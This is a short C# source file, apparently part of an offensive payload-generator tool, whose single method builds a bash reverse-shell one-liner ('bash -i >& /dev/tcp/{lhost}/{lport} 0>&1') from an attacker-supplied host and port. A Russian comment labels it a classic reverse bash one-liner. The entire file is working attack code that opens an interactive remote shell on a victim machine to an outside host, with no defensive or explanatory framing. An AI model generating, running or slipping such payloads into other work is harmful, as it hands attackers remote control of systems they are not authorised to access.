namespace BashPayloadGenerator
{
    public static class PayloadGenerator
    {
        public static string GenerateReverseBash(string lhost, string lport)
        {
            // Классический reverse bash one-liner
            return $"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1";
        }
    }
}
